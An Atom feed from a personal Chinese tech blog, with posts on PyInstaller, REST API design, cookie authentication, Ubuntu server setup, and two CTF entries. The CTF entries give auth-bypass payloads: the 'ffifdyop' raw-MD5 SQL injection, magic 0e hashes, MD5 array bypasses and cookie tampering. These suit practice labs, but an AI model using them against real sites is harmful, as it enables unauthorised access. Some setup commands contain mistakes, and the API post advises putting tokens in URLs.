<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>favorhau&#39;s blog</title>
  
  
  <link href="http://favorhau.github.io/atom.xml" rel="self"/>
  
  <link href="http://favorhau.github.io/"/>
  <updated>2021-10-16T04:55:42.303Z</updated>
  <id>http://favorhau.github.io/</id>
  
  <author>
    <name>favorhau</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>使用pyinstaller在64位系统打包32位exe文件</title>
    <link href="http://favorhau.github.io/2021/10/16/%E4%BD%BF%E7%94%A8pyinstaller%E5%9C%A864%E4%BD%8D%E7%B3%BB%E7%BB%9F%E6%89%93%E5%8C%8532%E4%BD%8Dexe%E6%96%87%E4%BB%B6/"/>
    <id>http://favorhau.github.io/2021/10/16/%E4%BD%BF%E7%94%A8pyinstaller%E5%9C%A864%E4%BD%8D%E7%B3%BB%E7%BB%9F%E6%89%93%E5%8C%8532%E4%BD%8Dexe%E6%96%87%E4%BB%B6/</id>
    <published>2021-10-16T04:55:45.000Z</published>
    <updated>2021-10-16T04:55:42.303Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>这些天为了解决一些需求，解决python程序打包exe并且能够兼容xp系统的问题，看过许多在stackoverflow等网站上面的回答，觉得在实际的操作过程当中反而还会遇到过一些相对严重的问题，以至于无法解决。经过多种测试之后找到了一种比较有效的方法。</p><h1 id="目前搜寻到的不太奏效方法"><a href="#目前搜寻到的不太奏效方法" class="headerlink" title="目前搜寻到的不太奏效方法"></a>目前搜寻到的不太奏效方法</h1><h2 id="使用anaconda安装pypiwin32等"><a href="#使用anaconda安装pypiwin32等" class="headerlink" title="使用anaconda安装pypiwin32等"></a>使用anaconda安装pypiwin32等</h2><p>这种方法实测之后效果并不一定好，因为安装过程当中也有可能会报错。并且会出现一些诸如no module found等问题</p><h2 id="直接使用虚拟机-XP系统进行打包"><a href="#直接使用虚拟机-XP系统进行打包" class="headerlink" title="直接使用虚拟机+XP系统进行打包"></a>直接使用虚拟机+XP系统进行打包</h2><p>这样会出现的问题</p><h1 id="有效的方法"><a href="#有效的方法" class="headerlink" title="有效的方法"></a>有效的方法</h1><h2 id="安装python3-4-4"><a href="#安装python3-4-4" class="headerlink" title="安装python3.4.4"></a>安装python3.4.4</h2><p>python3.4.4是最后支持Windows 32位的程序，下载地址：<br><a href="https://www.python.org/downloads/release/python-344/">https://www.python.org/downloads/release/python-344/</a><br><img src="https://img-blog.csdnimg.cn/41e2b7d1d39840c7b67d78295749ee1a.png" alt="图片"><br>在这里需要注意的是安装的时候需要配置环境变量，为了让效果最佳建议先卸载了原来的python版本，并且把此版本添加到环境变量当中</p><h2 id="更新pip"><a href="#更新pip" class="headerlink" title="更新pip"></a>更新pip</h2><p>此版本对应的最高的pip是19.1.1版本，但是在实际的upgrade当中可能会因为权限冲突，导致一些问题。因此可以采用<code>get-pip.py</code>进行安装</p><p>在Windows命令行输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://bootstrap.pypa.io/pip/3.4/get-pip.py -O get-pip.py</span><br></pre></td></tr></table></figure><p>将<code>get-pip.py</code>下载到当前目录<br>然后再运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python get-pip.py</span><br></pre></td></tr></table></figure><p>即可以完成pip19.1.1的安装</p><h2 id="安装对应版本的pyinstaller"><a href="#安装对应版本的pyinstaller" class="headerlink" title="安装对应版本的pyinstaller"></a>安装对应版本的pyinstaller</h2><p>这一步是最关键的一步，也是经常会遇到问题的一步，不论是怎么安装<br>都会报错<code>Python: setup.py egg_info failed with error code 1 </code>错误，<code>Stackoverflow</code>上面的解决方法为：<br><a href="https://stackoverflow.com/questions/49985465/python-setup-py-egg-info-failed-with-error-code-1">https://stackoverflow.com/questions/49985465/python-setup-py-egg-info-failed-with-error-code-1</a><br>但是这样一样会报出相关的错误<br>然而在pyinstaller的github release上面可以看到的是符合版本的为pyinstaller3.0<br>故可以</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pyinstaller==3.0</span><br></pre></td></tr></table></figure><h2 id="打包应用"><a href="#打包应用" class="headerlink" title="打包应用"></a>打包应用</h2><p>在此之后即可以使用pyinstaller去打包32位的程序了。并且可尝试在Windows10中，使用兼容模式运行，尝试运行。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;这些天为了解决一些需求，解决python程序打包exe并且能够兼容xp系统的问题，看过许多在stackoverflow等网站</summary>
      
    
    
    
    <category term="码农日常" scheme="http://favorhau.github.io/categories/%E7%A0%81%E5%86%9C%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="python" scheme="http://favorhau.github.io/tags/python/"/>
    
    <category term="pyinstaller" scheme="http://favorhau.github.io/tags/pyinstaller/"/>
    
  </entry>
  
  <entry>
    <title>Restful API设计规范</title>
    <link href="http://favorhau.github.io/2021/09/07/Restful%20API%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/"/>
    <id>http://favorhau.github.io/2021/09/07/Restful%20API%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83/</id>
    <published>2021-09-07T02:46:25.000Z</published>
    <updated>2021-09-07T09:15:00.396Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在尝试正式进行api文档编辑的过程当中，意图通过之前在写代码过程当中所积累到的接口设计经验编写一个高效清晰的api接口，但是若不经过一个api规范知识的摄取过程，效果可能不够好。在这里阅读了几份比较好的有关<code>RestfulAPI</code>的接口设计，结合自己的经验和风格，作出一些总结。</p><h1 id="HTTP方法规范"><a href="#HTTP方法规范" class="headerlink" title="HTTP方法规范"></a>HTTP方法规范</h1><blockquote><p> 查询数据使用<code>get</code>，创建数据使用<code>post</code>，更新数据使用<code>put</code>。</p></blockquote><p>但是往往在实际的工程当中使用<code>put</code>方法的比较少，建议以<code>?method=put</code>方式使用</p><p>如:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /v1/users/&lt;id&gt; //创建用户</span><br><span class="line">GET /v1/users/&lt;id&gt; //查询用户</span><br></pre></td></tr></table></figure><h1 id="资源规范"><a href="#资源规范" class="headerlink" title="资源规范"></a>资源规范</h1><blockquote><p>资源命名的时候需要是名词并且采用复数（尽管资源可能只有一个）</p></blockquote><p>如：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/vi/users //获取用户信息集合</span><br></pre></td></tr></table></figure><p>获取单个用户信息数据</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/v1/users/&lt;id&gt;</span><br></pre></td></tr></table></figure><p>在此过程当中url资源可能会层级很高，如：<code>/v1/1/2/</code></p><p>此时可以转换为别的方式查询</p><p>如</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/v1/users/?id=200121228</span><br></pre></td></tr></table></figure><h1 id="请求头规范"><a href="#请求头规范" class="headerlink" title="请求头规范"></a>请求头规范</h1><p><strong>Content-Type: application/json</strong></p><p>采用<code>json</code>进行传输，不采用<code>application/x-www-form-urlencoded</code>、<code>multipart/form-data</code></p><p>API 返回的数据格式，不应该是纯文本，而应该是一个 JSON 对象，因为这样才能返回标准的结构化数据。所以，服务器回应的 HTTP 头的Content-Type属性要设为application/json。</p><p>客户端请求时，也要明确告诉服务器，可以接受 JSON 格式，即请求的 HTTP 头的ACCEPT属性也要设成application/json。</p><h1 id="API规范与鉴权机制"><a href="#API规范与鉴权机制" class="headerlink" title="API规范与鉴权机制"></a>API规范与鉴权机制</h1><p>在前后端分离项目实际的接口鉴权当中，会遇到跨域的用户鉴权问题，一般通常采用以下两种方式</p><ol><li>Token机制</li><li>cookie机制</li></ol><ul><li>cookie机制</li></ul><p>cookie机制一般的流程为</p><p>1、用户向服务器发送用户名和密码。</p><p>2、服务器验证通过后，在当前对话（session）里面保存相关数据，比如用户角色、登录时间等等。</p><p>3、服务器向用户返回一个 session_id，写入用户的 Cookie。</p><p>4、用户随后的每一次请求，都会通过 Cookie，将 session_id 传回服务器。</p><p>5、服务器收到 session_id，找到前期保存的数据，由此得知用户的身份。</p><blockquote><p> 但这样显然服务器的扩展性不好，单机当然没有问题，如果是服务器集群，或者是跨域的服务导向架构，就要求 session 数据共享，每台服务器都能够读取 session。</p></blockquote><p>服务器保持无状态扩展性会更好</p><p>因此token就出现了</p><p>在这里引入<code>Restful Api</code>的<code>JWT</code>机制</p><p>简要概括就是在params（参数）处添加一个参数<code>token</code>，</p><p>token服务器保存一份，通常第一次请求服务器（登录）的时候产生，返回给客户端</p><p>因此客户端在后续的请求当中都需要携带上<code>token</code>，</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/v1/users?token=*****</span><br></pre></td></tr></table></figure><p>用于服务器校验</p><p>token可视为令牌，服务器里面蕴含了用户信息</p><p>每次请求的时候带上<code>token</code>，<code>token</code>里面也应该蕴含过期时间信息。</p><h1 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h1><ul><li>版本信息</li></ul><p>版本信息可以蕴含在api接口中，如</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/v1/users</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>【1】<a href="https://restfulapi.cn/">Restful Api官网</a></p><p>【2】<a href="https://restfulapi.cn/page/2">JWT机制</a></p><p>【3】<a href="http://novoland.github.io/%E8%AE%BE%E8%AE%A1/2015/08/17/Restful%20API%20%E7%9A%84%E8%AE%BE%E8%AE%A1%E8%A7%84%E8%8C%83.html">Restful API 的设计规范-克鲁思卡尔的博客</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;在尝试正式进行api文档编辑的过程当中，意图通过之前在写代码过程当中所积累到的接口设计经验编写一个高效清晰的api接口，但是若不经过一个ap</summary>
      
    
    
    
    <category term="restful api" scheme="http://favorhau.github.io/categories/restful-api/"/>
    
    <category term="api" scheme="http://favorhau.github.io/categories/restful-api/api/"/>
    
    <category term="后端" scheme="http://favorhau.github.io/categories/restful-api/api/%E5%90%8E%E7%AB%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>客户端认证机制</title>
    <link href="http://favorhau.github.io/2021/07/29/%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/"/>
    <id>http://favorhau.github.io/2021/07/29/%E5%AE%A2%E6%88%B7%E7%AB%AF%E8%AE%A4%E8%AF%81%E6%9C%BA%E5%88%B6/</id>
    <published>2021-07-29T12:46:25.000Z</published>
    <updated>2021-07-29T13:52:18.633Z</updated>
    
    <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>写一篇这样的文章是专门针对<code>客户端认证机制</code>的文章，为了对之前的一些相关的验证机制进行一个总结，对有关的一些授权机制能够更熟悉。在此之前，因为cookie跟session等的问题可能会使得一些授权信息混乱，想根据自己的实际经验跟HTTP权威指南的一些指引下，做一个总结。</p><h1 id="客户端验证机制"><a href="#客户端验证机制" class="headerlink" title="客户端验证机制"></a>客户端验证机制</h1><p>在HTTP的请求由许多的首部组成，</p><p>比如说 <code>reference</code>、<code>host</code>，每一个首部都会包含着一种请求信息。</p><p>首部由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: value</span><br></pre></td></tr></table></figure><p>这样的形式组成</p><p>在最开始的互联网世界当中，在访问互联网站点的时候第一次访问并没有记住一些数据内容，</p><p>这样使得在第二次访问的时候用户需要重新输入一些内容，</p><p>这样就会造成许多不便</p><p>那么在指定HTTP标准的时候，便想有一种机制</p><p>对用户身份进行识别，</p><p>在初期有几个识别方案</p><ul><li>ip地址</li></ul><p>根据ip地址对客户端进行识别验证显然不是一个好的选择，因为ip地址很容易伪造</p><p>比如说我可以通过使用代理去伪造身份，还有另外一个原因就是对于一些网络运营商，往往分配的ip是动态ip，</p><p>因此在服务器对客户端验证的时候并不能作为一个唯一的标识，对其进行识别</p><ul><li>reference</li></ul><p>用<code>reference</code>能够识别访问来源，但是同样也可以很容易进行伪造，从而使得无法对用户进行有效验证。</p><p>假设一种场景，作为一个个人用户，在访问网页的时候，我希望我的访问能够被浏览器记录下来，而不用每一次都进行用户登录，这时候<code>cookie</code>就为了解决需求而生</p><h1 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h1><blockquote><p>在进行浏览器访问的时候，有一些网站会询问是否运行Cookie，除此在设置里面同时也可以禁止cookie，</p><p>浏览器可以根据用户需要将cookie存储起来，在下次访问的时候账号密码就已经为用户储存好了</p></blockquote><p>上面提到的就是长期cookie</p><p>在cookie的发明制定以来，存在着两种标准。</p><p>在客户端服务器的验证过程中，由服务器向客户端发送一个<code>set-cookie</code>请求</p><p><a href="https://imgtu.com/i/Wq0eL4"><img src="https://z3.ax1x.com/2021/07/29/Wq0eL4.png" alt="Wq0eL4.png"></a></p><p>在接受请求之后储存在客户端当中，</p><p><a href="https://imgtu.com/i/Wq0ZyF"><img src="https://z3.ax1x.com/2021/07/29/Wq0ZyF.png" alt="Wq0ZyF.png"></a></p><p>在下一次发送请求当中，客户端会带上cookie请求服务器，服务器可以根据cookie的信息再返回相关的值给客户端。</p><p>在cookie中有一个值<code>Max-Age</code>（版本1为Expires）用于记录cookie销毁时间，而且两个的机制不太一样，一超过授权时间，</p><p>cookie就会失效，就需要重新验证。</p><h1 id="Cookie与Session"><a href="#Cookie与Session" class="headerlink" title="Cookie与Session"></a>Cookie与Session</h1><p><del>手动面试题警告</del></p><p>这是涉及到比较多的问题，对二者的比较也在不断</p><p>在一次DEMO的编写当中</p><p>在flask里面，只需要简单的语句即可以进行一系列验证</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request,render_template,Response, session, redirect</span><br><span class="line">session[<span class="string">&#x27;user&#x27;</span>] = username</span><br></pre></td></tr></table></figure><p>那么session跟cookie二者有什么区别呢？</p><p>在这个问题之前我想问自己一个问题</p><blockquote><p>cookie如果是可读写的，并且如果是明文传输的话，那么不是会很不安全？</p></blockquote><p>在我看来，其实session机制属于cookie的一种实现</p><p>二是session往往都是加密后的数据（非明文传输），这就解决掉了许多安全上的问题。</p><p>但是本质上的不同在于</p><blockquote><p>session储存在服务器上，cookie储存在客户端上</p></blockquote><p><code>session</code>means 会话，</p><p>一般来说，可以将session储存在服务器当中，用于识别用户状态</p><p>在我看来，session就相当于一种短暂的cookie机制</p><h1 id="Cookie与安全"><a href="#Cookie与安全" class="headerlink" title="Cookie与安全"></a>Cookie与安全</h1><p>在Cookie设计当中，同时也会经常出现一些安全方面的问题。</p><p>当然先肯定cookie在设计的时候使用<code>domain</code>解决了跨域问题，用<code>Max-Age</code>解决了授权时间问题，</p><p>但仍然会出现一些问题</p><p>首先cookie虽然往往是加密后的内容，但是cookie是可以更改的，并且</p><p>在许多时候，可以利用cookie进行模拟登录</p><p>甚至修改一些个人信息。</p><p>期待更深入探索客户端验证</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h1&gt;&lt;p&gt;写一篇这样的文章是专门针对&lt;code&gt;客户端认证机制&lt;/code&gt;的文章，为了对之前的一些相关的验证机制进行一个总结，对有关</summary>
      
    
    
    
    <category term="服务器" scheme="http://favorhau.github.io/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/"/>
    
    <category term="cookies" scheme="http://favorhau.github.io/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8/cookies/"/>
    
    
  </entry>
  
  <entry>
    <title>210115CTF练习记录</title>
    <link href="http://favorhau.github.io/2021/01/15/210115CTF%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <id>http://favorhau.github.io/2021/01/15/210115CTF%E7%BB%83%E4%B9%A0%E8%AE%B0%E5%BD%95/</id>
    <published>2021-01-15T14:19:45.000Z</published>
    <updated>2021-01-15T15:09:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>RT</p><span id="more"></span><h1 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h1><p><a href="https://imgchr.com/i/sBkHe0"><img src="https://s3.ax1x.com/2021/01/15/sBkHe0.png" alt="sBkHe0.png"></a><br>一开始查看，第一感觉有可能是弱密码碰撞。（但是后来也觉得不会那么傻逼吧，也木有密码长度的提示）尝试点击一下提交。抓取得到下面的隐藏信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from &#x27;admin&#x27; where password=md5($pass,true)</span><br></pre></td></tr></table></figure><p>大概率是密码绕过，<del>（根据wp）</del>这时候有一个有一个密码<code>ffifdyop</code>MD5之后结果是<code>276f722736c95d99e921722cf9ed621c</code>，而这个字符串前几位刚好是’ or ‘6， Mysql 刚好又会把 hex 转成 ascii 解释。</p><p><a href="https://imgchr.com/i/sBAAYD"><img src="https://s3.ax1x.com/2021/01/15/sBAAYD.png" alt="sBAAYD.png"></a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; md5(<span class="variable">$a</span>) == md5(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>查看源代码是这个结果，常规的弱类型比较。</p><p>使用常用的弱类型比较</p><p><code>QNKCDZO</code>MD5:<code>0e830400451993494058024219903391</code><br><code>s878926199a</code> MD5:<code>0e545993274517709034328855841020</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===md5(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>md5强比较，此时如果传入的两个参数不是字符串，而是数组，md5()函数无法解出其数值，而且不会报错，就会得到===强比较的值相等。构造payload</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">param1[]=111&amp;param2[]=222</span><br></pre></td></tr></table></figure><p>得到flag。。</p><h1 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag need your 100000000 money</span><br></pre></td></tr></table></figure><p>有点像遇到过修改post数据包的考点，仔细看一下下面还有提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">If you want to buy the FLAG:</span><br><span class="line">You must be a student from CUIT!!!</span><br><span class="line">You must be answer the correct password!!! </span><br></pre></td></tr></table></figure><p>三个条件</p><ul><li>用户身份</li><li>password</li><li>money</li></ul><p>一眼过去觉得最容易解决的就是<strong>money</strong>了，按照他的来就好。</p><p>然后关于<strong>password</strong>去看了一些源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money <span class="keyword">and</span> password~~~</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (is_numeric(<span class="variable">$password</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;password can&#x27;t be number&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">elseif</span> (<span class="variable">$password</span> == <span class="number">404</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Password Right!&lt;/br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>基本上就是弱类型比较</p><p>接着的话就是用户身份（我查了一下wp才了解）</p><p>一直有定式思维用user-agent，这一次改的是cookie。</p><p>把<code>user=0</code>改成<code>user=1</code>即可。</p><p>中途还提示了money参数过长，这时候转换成科学计数法。</p><p>，构造payload。</p><p><a href="https://imgchr.com/i/sBejMQ"><img src="https://s3.ax1x.com/2021/01/15/sBejMQ.png" alt="sBejMQ.png"></a></p><p>得到flag。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;RT&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="CTF" scheme="http://favorhau.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>CTF备忘录</title>
    <link href="http://favorhau.github.io/2021/01/15/CTF%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>http://favorhau.github.io/2021/01/15/CTF%E5%A4%87%E5%BF%98%E5%BD%95/</id>
    <published>2021-01-15T14:19:45.000Z</published>
    <updated>2021-01-16T14:10:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>CTF常用密码备忘录（持续更新）</p><span id="more"></span><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>摘录自己学习过程当中遇到的常用CTF密码，可供以后使用。</p><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><ul><li><code>ffifdyop</code>MD5之后结果是<code>276f722736c95d99e921722cf9ed621c</code>，而这个字符串前几位刚好是’ or ‘6， Mysql 刚好又会把 hex 转成 ascii 解释。（mysql万能密码）</li><li><code>QNKCDZO</code>MD5:<code>0e830400451993494058024219903391</code><br><code>s878926199a</code> MD5:<code>0e545993274517709034328855841020</code><br>（弱类型比较）</li><li><code>https://github.com/noraj/flask-session-cookie-manager</code>用于<code>flask</code>框架session伪造</li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;CTF常用密码备忘录（持续更新）&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    
    <category term="CTF" scheme="http://favorhau.github.io/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu下web服务器搭建</title>
    <link href="http://favorhau.github.io/2021/01/06/ubuntu%E4%B8%8Bweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    <id>http://favorhau.github.io/2021/01/06/ubuntu%E4%B8%8Bweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</id>
    <published>2021-01-06T08:19:45.000Z</published>
    <updated>2021-01-06T08:22:26.000Z</updated>
    
    <content type="html"><![CDATA[<p>2021年的第一篇文章~ 关于Ubuntu下web服务器的搭建</p><span id="more"></span><p>Google上面的搜索联想看出应该是挺热的搜索词<br><a href="https://imgchr.com/i/sERY9J"><img src="https://s3.ax1x.com/2021/01/06/sERY9J.png" alt="sERY9J.png"></a></p><h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p><code>Ubuntu</code>是<code>Linux</code>的发行版，具有可视化的操作见面，可用作个人的小型服务器。<br><code>apache</code>http服务器是运用最广泛的web服务器，他提供了许多强大的功能包括动态加载模块、强大的媒体支持和广泛的集成等。</p><p>我使用了相对稳定的<code>16.4</code>版本。</p><h1 id="安装Apache"><a href="#安装Apache" class="headerlink" title="安装Apache"></a>安装Apache</h1><p>先更新本地文件包索引。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>再键入以下命令安装apache2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><p>这时候在浏览器打开<code>localhost</code>可以看到安装完毕的apache。<br><a href="https://imgchr.com/i/sEhm1H"><img src="https://s3.ax1x.com/2021/01/06/sEhm1H.png" alt="sEhm1H.png"></a></p><h1 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h1><p>键入一下命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php7.0 libapache2-mod-php7.0</span><br></pre></td></tr></table></figure><p>再让apache重新启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service apche2 restart</span><br></pre></td></tr></table></figure><h1 id="安装mysql"><a href="#安装mysql" class="headerlink" title="安装mysql"></a>安装mysql</h1><p>必不可少的一部分当然是<code>MYSQL</code>数据库啦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>安装mysql服务器和客户端。</p><h1 id="安装phpmyadmin"><a href="#安装phpmyadmin" class="headerlink" title="安装phpmyadmin"></a>安装phpmyadmin</h1><p>phpmyadmin真香~<br><code>phpMyAdmin</code>是一个网络接口，通过它可以管理mysql数据库。执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install phpmyadmin</span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/sEvJ6x"><img src="https://s3.ax1x.com/2021/01/06/sEvJ6x.md.png" alt="sEvJ6x.md.png"></a><br>这样查看数据表还是容易很多的。</p><h1 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h1><p>就这样一个<del>简易的</del>web服务器就搭建完成了。<br>apt好像有点有趣~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;2021年的第一篇文章~ 关于Ubuntu下web服务器的搭建&lt;/p&gt;</summary>
    
    
    
    <category term="CTF求生之路" scheme="http://favorhau.github.io/categories/CTF%E6%B1%82%E7%94%9F%E4%B9%8B%E8%B7%AF/"/>
    
    <category term="教程" scheme="http://favorhau.github.io/categories/%E6%95%99%E7%A8%8B/"/>
    
    
    <category term="apache" scheme="http://favorhau.github.io/tags/apache/"/>
    
    <category term="服务器搭建" scheme="http://favorhau.github.io/tags/%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    
  </entry>
  
  <entry>
    <title>Welcome to Regular Expression</title>
    <link href="http://favorhau.github.io/2020/12/27/Welcome%20to%20Regular%20Expression/"/>
